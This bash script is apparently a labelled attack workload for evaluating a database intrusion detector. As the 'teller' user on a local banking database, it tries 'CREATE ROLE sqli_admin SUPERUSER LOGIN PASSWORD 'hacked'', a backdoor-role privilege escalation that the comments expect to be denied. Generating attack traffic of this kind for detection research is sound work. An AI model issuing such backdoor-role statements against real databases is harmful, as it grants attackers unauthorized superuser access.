#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_sqli_role.sh (legacy: casce_tpcb, -U postgres).
# Only connection and label changed; the statement is unchanged. teller has no CREATEROLE
# and no banking role may grant SUPERUSER (only a real superuser can), so this is expected
# to be denied. Note: the payload itself is a backdoor-role CREATE statement, the same
# technique as attack_privilege_abuse.sh / attack_multi_session_apt.sh -- see the report
# for why it is still grouped under sql_injection, matching the task's script-to-group list.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: SQL injection (backdoor role via injection), repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:sqli_role_r${REPEAT}" \
  $PSQL -U teller -c "CREATE ROLE sqli_admin SUPERUSER LOGIN PASSWORD 'hacked';"
